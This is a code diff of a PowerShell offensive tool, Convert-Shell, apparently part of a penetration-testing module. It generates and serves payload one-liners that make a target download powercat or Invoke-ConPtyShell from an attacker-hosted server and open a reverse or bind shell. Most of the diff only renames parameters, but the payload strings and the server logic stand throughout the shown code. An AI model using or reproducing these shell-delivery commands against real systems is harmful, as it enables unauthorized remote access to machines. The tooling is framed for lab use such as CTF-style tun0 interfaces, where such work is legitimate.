@@ -11,62 +11,62 @@ function Convert-Shell
     from the attack host and instructs the target system to download
     it, followed by executing a shell
 
-.PARAMETER type
+.PARAMETER Type
     Shell type (powercat|conpty)
     Alias: t
 
-.PARAMETER interface
+.PARAMETER Interface
     Interface name
     Alias: i
 
-.PARAMETER reverse
+.PARAMETER Reverse
     Executes a reverse shell
     Alias: r
     This is the default choice
 
-.PARAMETER bind
+.PARAMETER Bind
     Executes a powercat bind shell
     Alias: b
 
-.PARAMETER lhost
+.PARAMETER LHOST
     Listen addr|interface for powercat reverse shell
     Can be omitted since -i will pre-populate
-    both -lhost and -srvhost
+    both -LHOST and -Srvhost
     Alias: lh
     Defaults to tun0
 
-.PARAMETER lport
+.PARAMETER LPORT
     Listening port (bind|reverse)
     Alias: lp
 
-.PARAMETER serve
+.PARAMETER Serve
     Starts a Python HTTP server
     Alias: s
     Ctrl+C stops the running server
 
-.PARAMETER srvhost
+.PARAMETER Srvhost
     Address for serving powercat.ps1
     Alias: sh
     Defaults to designated interface
 
-.PARAMETER srvport
+.PARAMETER Srvport
     Listening port for serving powercat.ps1
     Alias: sp
 
-.PARAMETER exec
+.PARAMETER Exec
     Command to execute
     Alias: e
 
-.PARAMETER rows
+.PARAMETER Rows
     Terminal height
     Default: current terminal window's height
 
-.PARAMETER cols
+.PARAMETER Cols
     Terminal width
     Default: current terminal window's width
 
 .EXAMPLE
-    Convert-Shell -t powercat -i tun0 -lport 443 -serve
+    Convert-Shell -t powercat -i tun0 -LPORT 443 -Serve
 
 .EXAMPLE
     Convert-Shell -t powercat -i tun0 -lp 443 -s -sp 8080 -e cmd
@@ -75,10 +75,10 @@ function Convert-Shell
     cvsh -t conpty -i tun0 -lp 443 -s
 
 .EXAMPLE
-    cvsh -t conpty -i tun0 -lp 443 -s -rows 51 -cols 191 -sh tun0 -sp 8000
+    cvsh -t conpty -i tun0 -lp 443 -s -Rows 51 -Cols 191 -sh tun0 -sp 8000
 
 .EXAMPLE
-    cvsh -t conpty -i tun0 -lp 443 -s -rows 51 -cols 191 -sh 192.168.45.120 -sp 8000
+    cvsh -t conpty -i tun0 -lp 443 -s -Rows 51 -Cols 191 -sh 192.168.45.120 -sp 3000
 
 .INPUTS
     String
@@ -90,122 +90,53 @@ function Convert-Shell
 		
     [Parameter(Mandatory = $true)]
     [Alias("t")]
-    [String]$type = 'conpty',
+    [String]$Type = "conpty",
 
     [Parameter(Mandatory = $false)]
     [Alias("i")]
-    [String]$interface = 'tun0',
+    [String]$Interface = "tun0",
 
     [Parameter(Mandatory = $false)]
     [Alias("lh")]
-    [String]$lhost = '',
+    [String]$LHOST = "",
 
 		[Parameter(Mandatory = $true)]
     [Alias("lp")]
-    [String]$lport = '443',
+    [String]$LPORT = "443",
 
 		[Parameter(Mandatory = $false)]
     [Alias("r")]
-    [Switch]$reverse = $true,
+    [Switch]$Reverse = $true,
 
 		[Parameter(Mandatory = $false)]
     [Alias("b")]
-    [Switch]$bind = $false,
+    [Switch]$Bind = $false,
 
 		[Parameter(Mandatory = $false)]
     [Alias("s")]
-    [Switch]$serve,
+    [Switch]$Serve,
 
     [Parameter(Mandatory = $false)]
     [Alias("sh")]
-    [String]$srvhost = '0.0.0.0',
+    [String]$Srvhost = "0.0.0.0",
 
 		[Parameter(Mandatory = $false)]
     [Alias("sp")]
-    [String]$srvport = '80',
+    [String]$Srvport = "80",
     
 		[Parameter(Mandatory = $false)]
     [Alias("e")]
-    [String]$exec = 'powershell',
+    [String]$Exec = "powershell",
 
 		[Parameter(Mandatory = $false)]
-    [String]$rows = $host.UI.RawUI.WindowSize.Height,
+    [String]$Rows = $host.UI.RawUI.WindowSize.Height,
 
 		[Parameter(Mandatory = $false)]
-    [String]$cols = $host.UI.RawUI.WindowSize.Width
+    [String]$Cols = $host.UI.RawUI.WindowSize.Width
 
     )
 
-  # Grab interface IPv4 addr
-  $ip = Get-InterfaceAddress -i $interface
-
-  switch -Regex ( $srvhost ) {
-    
-    "^0.0.0.0$" {
-        $srvhost = $ip
-    }
-
-    { $_ -as [ipaddress] } {
-        $srvhost = $srvhost
-    }
-
-    "^([a-z]+[0-9]|lo)$" {
-        Write-Output ""
-        $srvhost = Get-InterfaceAddress -i $srvhost
-        if ( !$srvhost ) {
-            $srvhost = $ip
-        }
-    }
-
-    default {
-        Write-Output ""
-        Write-Host "[-] Invalid interface name or IPv4 address: $srvhost" -ForegroundColor Red
-        Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
-        $srvhost = $ip
-    }
-
-  }
-
-  switch -Regex ( $lhost ) {
-    
-    "^0.0.0.0$" {
-        $lhost = $ip
-    }
-
-    "^$" {
-        $lhost = $ip
-    }
-
-    { $_ -as [ipaddress] } {
-        $lhost = $lhost
-    }
-
-    '^([a-z]+[0-9])|lo$' {
-        Write-Output ""
-        $nullHost = $lhost
-        $lhost = Get-InterfaceAddress -i $lhost
-        if ( !$lhost ) {
-            Write-Output ""
-            Write-Host "[-] Invalid interface name or IPv4 address: ($nullHost)" -ForegroundColor Red
-            Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
-            $lhost = $ip
-        }
-    }
-
-    '^$' {
-        $lhost = $ip
-    }
-
-    default {
-        Write-Output ""
-        Write-Host "[-] Invalid interface name or IPv4 address: $lhost" -ForegroundColor Red
-        Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
-        $lhost = $ip
-    }
-
-  }
-
-  $rootWarn=@'
+  $rootWarn=@"
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @           HERE COMES THE BIG BRIGHT RED WARNING           @
@@ -219,18 +150,88 @@ function Convert-Shell
 @ --------------------------------------------------------- @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
-'@
+"@
 
   # Seriously. Stop.
-  if ( $env:USER -eq 'root' ) {
+  if ( $env:USER -eq "root" ) {
     Write-Host $rootWarn -ForegroundColor Red
     exit(1)
   }
-  elseif ( !$ip ) {
+
+  # Grab interface IPv4 addr
+  $ip = Get-InterfaceAddress -i $Interface
+
+  switch -Regex ( $Srvhost ) {
+    
+    "^0.0.0.0$" {
+        $Srvhost = $ip
+    }
+
+    { $_ -as [ipaddress] } {
+        $Srvhost = $Srvhost
+    }
+
+    "^([a-z]+[0-9]|lo)$" {
+        Write-Output ""
+        $Srvhost = Get-InterfaceAddress -i $Srvhost
+        if ( !$Srvhost ) {
+            $Srvhost = $ip
+        }
+    }
+
+    default {
+        Write-Output ""
+        Write-Host "[-] Invalid interface name or IPv4 address: $Srvhost" -ForegroundColor Red
+        Write-Host "[!] Falling back to selected interface: $Interface ($ip)" -ForegroundColor Magenta
+        $Srvhost = $ip
+    }
+
+  }
+
+  switch -Regex ( $LHOST ) {
+    
+    "^0.0.0.0$" {
+        $LHOST = $ip
+    }
+
+    "^$" {
+        $LHOST = $ip
+    }
+
+    { $_ -as [ipaddress] } {
+        $LHOST = $LHOST
+    }
+
+    "^([a-z]+[0-9])|lo$" {
+        Write-Output ""
+        $nullHost = $LHOST
+        $LHOST = Get-InterfaceAddress -i $LHOST
+        if ( !$lhost ) {
+            Write-Output ""
+            Write-Host "[-] Invalid interface name or IPv4 address: ($nullHost)" -ForegroundColor Red
+            Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
+            $LHOST = $ip
+        }
+    }
+
+    "^$" {
+        $LHOST = $ip
+    }
+
+    default {
+        Write-Output ""
+        Write-Host "[-] Invalid interface name or IPv4 address: $LHOST" -ForegroundColor Red
+        Write-Host "[!] Falling back to selected interface: $Interface ($ip)" -ForegroundColor Magenta
+        $LHOST = $ip
+    }
+
+  }
+
+  if ( !$ip ) {
     Write-Prompts -m "[-] Invalid interface" -t e
   }
   else {
-    switch ( $type ) {
+    switch ( $Type ) {
 
         "conpty" {
           # Check whether extensions subdirectory exists
@@ -252,18 +253,20 @@ Performing the operation "Download File" on target "Destination: $extDir/Invoke-
               Write-Host "[Y] Yes  " -ForegroundColor Yellow -NoNewline
               Write-Host "[N] No  " -ForegroundColor White -NoNewline
               $confirmDownload = Read-Host -Prompt "(default is `"Y`")"
-              if ( (!$confirmDownload) -Or ($confirmDownload.ToLower() -eq 'y') ) {
-                $ProgressPreference = 'SilentlyContinue'
+              if ( (!$confirmDownload) -Or ($confirmDownload.ToLower() -eq "y") ) {
+                $ProgressPreference = "SilentlyContinue"
                 Invoke-WebRequest -Uri "https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.ps1" -Outfile "$extDir/Invoke-ConPtyShell.ps1"
                 Write-Prompts -m "[+] Invoke-ConPtyShell.ps1 downloaded successfully" -t s
+                $conf.Dependencies.Extensions | Where-Object Module -eq "Invoke-ConPtyShell" | ? { $_.Status = "OK" }
+                $conf | ConvertTo-JSON -Depth 4 | Out-File $env:HOME/.local/share/powershell/Modules/PSX/.config/config.json
 
-                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $lhost $lport -Rows $rows -Cols $cols"
+                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $LHOST $LPORT -Rows $Rows -Cols $Cols"
                 Write-Prompts -s $string -t po
 
                 # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
                 # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
-                if ( $serve ) {
-                    Invoke-Server -b $srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $srvport
+                if ( $Serve ) {
+                    Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty
                 }
               }
               else {
@@ -272,34 +275,34 @@ Performing the operation "Download File" on target "Destination: $extDir/Invoke-
             }
           }
           else {
-            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $lhost $lport -Rows $rows -Cols $cols"
+            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $LHOST $LPORT -Rows $Rows -Cols $Cols"
             Write-Prompts -s $string -t po
 
             # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
             # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
-            if ( $serve ) {
-                Invoke-Server -b $srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $srvport
+            if ( $Serve ) {
+                Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty
             }
           }
         }
 
         "powercat" {
-          if ( $bind ) {
-            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/powercat.ps1');powercat -l -p $lport -e $exec"
+          if ( $Bind ) {
+                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/powercat.ps1');powercat -l -p $LPORT -e $Exec"
             }
           else {
-            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$srvhost`:$srvport/powercat.ps1');powercat -c $lhost -p $lport -e $exec"
+                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/powercat.ps1');powercat -c $LHOST -p $LPORT -e $Exec"
             }
 
           Write-Prompts -s $string -t po
 
           # Spin up a Python HTTP server, hosting powercat.ps1 from its original location
-          if ( $serve ) {
-              if ( !$bind ) {
-                  Invoke-Server -b $srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $srvport
+          if ( $Serve ) {
+              if ( !$Bind ) {
+                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -Shell powercat
               }
               else {
-                  Invoke-Server -b $srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $srvport -pcb
+                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -PCB
               }
           }
         }
